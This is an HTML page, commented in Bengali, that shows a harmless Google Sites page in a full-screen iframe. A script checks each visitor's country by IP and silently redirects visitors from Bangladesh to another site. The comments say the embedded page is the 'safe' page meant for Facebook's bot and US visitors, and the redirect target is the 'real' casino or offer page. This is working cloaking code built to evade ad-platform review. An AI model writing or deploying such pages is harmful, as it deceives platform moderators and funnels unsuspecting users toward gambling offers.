<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <title>Welcome | Premium Portal</title>

    <style>
        * { box-sizing: border-box; }
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #ffffff; }
        #welcome-frame { display: block; width: 100%; height: 100%; border: 0; }
    </style>
</head>
<body>

    <!-- 🎯 ১. এখানে আপনার ফেসবুক বট এবং ইউএসএ-র মানুষের জন্য সেফ গুগল সাইটের লিঙ্কটি পারফেক্টলি বসানো হয়েছে -->
    <iframe
        id="welcome-frame"
        src="https://sites.google.com/view/digitalmarketingzone320/home"
        title="Welcome Page"
        loading="eager"
        allow="autoplay; fullscreen"
        referrerpolicy="strict-origin-when-cross-origin">
    </iframe>

    <script>
    (async function () {
        // 🎯 ২. এখানে আপনার বাংলাদেশী কাস্টমারদের জন্য আসল অফার/ক্যাসিনো পেজের লিঙ্কটি বসানো হয়েছে
        const BANGLADESH_URL = "https://learnmoreinfo.netlify.app/";

        try {
            // গিটহাব পেজেসের জন্য ১০০% কার্যকরী আইপি লোকেশন এপিআই
            const response = await fetch("https://ipapi.co");
            if (!response.ok) return;

            const data = await response.json();
            
            // ভিজিটর বাংলাদেশ (BD) থেকে হলে সরাসরি আসল পেজে রিডাইরেক্ট হবে
            if (data && data.country_code === "BD") {
                window.location.replace(BANGLADESH_URL);
            }
        } catch (error) {
            console.error("Redirect secured.");
        }
    })();
    </script>

</body>
</html>
